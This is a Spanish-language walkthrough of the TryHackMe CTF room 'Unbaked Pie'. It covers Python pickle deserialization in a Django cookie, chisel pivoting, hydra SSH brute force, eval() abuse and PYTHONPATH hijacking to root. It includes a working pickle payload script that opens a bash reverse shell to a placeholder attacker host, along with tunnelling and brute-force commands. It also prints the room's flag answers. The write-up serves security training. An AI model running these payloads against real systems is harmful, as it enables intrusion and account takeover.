# Unbaked Pie

| Dificultad | Tipo | Slug | Link | Sección | Fuente | Componentes | Impacto |
|-----------|------|------|------|--------|--------|-------------|---------|
| Medium | CTF / Deserialización insegura | unbakedpie | https://tryhackme.com/room/unbakedpie | 02 Level Medium | TryHackMe | pickles de Python, Docker, chisel, hydra, eval(), PYTHONPATH hijacking | Compromiso total del host (root) |

---

**Contexto:** La sala **Unbaked Pie** es un CTF que enseña a explotar **deserialización insegura en Python (pickle)** y pivoting. Se enumera una web Django en modo debug en el puerto 5003; la cookie `search_cookie` contiene un objeto `pickle` serializado y modificable, lo que permite **RCE** y obtener una shell root de un contenedor Docker. Desde el contenedor se pivota con **chisel** al port forward del SSH del host, se fuerza SSH con **hydra** como `ramsey`, y se escala dos veces más: abusando de un `eval()` sin sanear en `vuln.py` (sudo como `oliver`) y mediante **module hijacking** con `PYTHONPATH` sobre `/opt/dockerScript.py` (sudo con `SETENV` como root) para terminar leyendo la flag final.

## Solucionario

### Task 1: Enumerate the target / Enumeración
**Explicación:**

Se escanea la máquina: solo el puerto 5003 (HTTP) está abierto, sirviendo una web Django/FastAPI con posts que hablan de "pickle". El modo debug de Django (si se fuerza una ruta inexistente) filtra información del stack, confirmando la tecnología.

```bash
rustscan -a <IP> | tee rustscan.txt
nmap -sC -sV -p 5003 <IP>
# 5003/tcp open http (Python web app)
```

| Pregunta | Respuesta |
|----------|-----------|
| Explore the target | `No answer needed` |

### Task 2: Exploit the pickle vulnerability / Explotar pickle
**Explicación:**

La aplicación usa la cookie `search_cookie=` para "recordar" la búsqueda; es un objeto serializado con `pickle` codificado en Base64. Se genera con un script Python un payload `pickle` que, al ser deserializado (unpickle), ejecuta un comando del sistema (RCE). Se confirma con `ping`/`tcpdump` y después se envía un reverse shell para obtener una shell **root dentro de un contenedor Docker**.

```python
#!/usr/bin/python3
import pickle, os, base64
class RCE(object):
    def __reduce__(self):
        return (os.system, ("/bin/bash -c 'bash -i >& /dev/tcp/<ATK>/1234 0>&1'",))
print(base64.b64encode(pickle.dumps(RCE())).decode())
```

```bash
# Envío del payload en /search con la cookie search_cookie=<payload>
nc -lvnp 1234
# Shell root del contenedor Docker (172.17.0.x)
```

| Pregunta | Respuesta |
|----------|-----------|
| Initial foothold | `No answer needed` |

### Task 3: Pivot to the host / Pivoting
**Explicación:**

Dentro del contenedor se inspecciona `.bash_history` y se ve que alguien hace SSH a `172.17.0.1` (el host) como **ramsey**. Se escanean los puertos de la red docker con `nc`, se transfiere **chisel** y se monta un túnel reverso para exponer el SSH del host en la máquina atacante:

```bash
# Atacante:
./chisel server --port 8000 --socks5 --reverse

# Contenedor:
./chisel client <ATK>:8000 R:1234:172.17.0.1:22

# Ahora 127.0.0.1:1234 apunta al SSH del host:
nmap 127.0.0.1 -p 1234
```

| Pregunta | Respuesta |
|----------|-----------|
| Port forwarding and pivoting | `No answer needed` |

### Task 4: Pwn the host as ramsey / Acceso al host
**Explicación:**

Con el túnel activo se fuerza la contraseña SSH de `ramsey` con **hydra** y `rockyou.txt`. Con las credenciales se entra por SSH. En el home se encuentra la **flag de usuario** y, ejecutando `sudo -l`, se descubre que `ramsey` puede ejecutar `/usr/bin/python /home/ramsey/vuln.py` como `oliver` sin contraseña.

```bash
hydra -l ramsey -P /usr/share/wordlists/rockyou.txt -t 64 -s 1234 ssh://127.0.0.1
# [1234][ssh] login: ramsey   password: 12345678

ssh ramsey@127.0.0.1 -p 1234
cat user.txt
sudo -l
# (oliver) /usr/bin/python /home/ramsey/vuln.py
```

| Pregunta | Respuesta |
|----------|-----------|
| What is the user flag? | `THM{ce778dd41bec31e1daed77ebebcd7423}` |

### Task 5: Escalate to oliver and root / Escalar a root
**Explicación:**

`vuln.py` lee una imagen `payload.png`, extrae el texto con `pytesseract` y lo ejecuta con **`eval()`** sin sanear. Como `ramsey` puede editar el script (o el PNG), se crea un `payload.png` cuyo texto es `__import__('os').system('/bin/bash')`. Al ejecutar `sudo -u oliver ... vuln.py`, se obtiene una shell como **oliver**. Ya como `oliver`, `sudo -l` muestra que puede ejecutar `/usr/bin/python /opt/dockerScript.py` como root con opción **SETENV**. `dockerScript.py` hace `import docker`, así que se crea un `docker.py` malicioso en `/tmp` y se fuerza su importación con `PYTHONPATH=/tmp`, generando una shell root y la flag final.

```python
# docker.py (módulo malicioso):
import os
os.system("/bin/bash")
```

```bash
sudo -u oliver /usr/bin/python /home/ramsey/vuln.py
# ...shell como oliver

cd /tmp && printf 'import os\nos.system("/bin/bash")\n' > docker.py
sudo PYTHONPATH=/tmp/ /usr/bin/python /opt/dockerScript.py
# root shell
cat /root/root.txt
```

| Pregunta | Respuesta |
|----------|-----------|
| What is the root flag? | `THM{1ff4c893b3d8830c1e188a3728e90a5f}` |

### Tabla de preguntas y respuestas

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 2 | Initial foothold (RCE via pickle) | `No answer needed` |
| 3 | Port forwarding and pivoting | `No answer needed` |
| 4 | What is the user flag? | `THM{ce778dd41bec31e1daed77ebebcd7423}` |
| 5 | What is the root flag? | `THM{1ff4c893b3d8830c1e188a3728e90a5f}` |

---

**Metodología:** Escaneo de puertos, explotación de deserialización insegura de `pickle` en la cookie para RCE, pivoting con `chisel` hacia el SSH del host, fuerza bruta SSH con `hydra`, abuso de un `eval()` sin sanear para escalar a `oliver`, y secuestro de módulo de Python con `PYTHONPATH` (SETENV) para root.

### Cadena de ataque / Attack Chain

```
nmap/rustscan → Django debug 5003 → pickle cookie RCE → shell root en Docker → .bash_history (ramsey) → nc port scan 172.17.0.1 → chisel reverse tunnel → hydra SSH ramsey → user flag → vuln.py eval() → sudo oliver → dockerScript.py import docker → PYTHONPATH hijacking → root → root flag
```

**Learning chain:** Reconocimiento → deserialización insegura (pickle) → ejecución remota de código → escape de contenedor/pivoting → brute force SSH → inyección vía eval() → escalada de privilegios por manipulación de PYTHONPATH.

**Lección:** *El pickle de Python nunca debe deserializar datos de usuario - es RCE puro; y un sudo con SETENV permite redirigir el `import` de un script privilegiado hacia un módulo propio, convirtiendo la confianza en un path controlado en root.*

**MITRE ATT&CK:** T1190 Exploit Public-Facing Application · T1203 Exploitation for Client Execution · T1059.006 Python · T1210 Exploitation of Remote Services · T1068 Exploitation for Privilege Escalation · T1574.006 Hijack Execution Flow (Dynamic Linker/PYTHONPATH).

**Fuente:** [TryHackMe - Unbaked Pie](https://tryhackme.com/room/unbakedpie)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.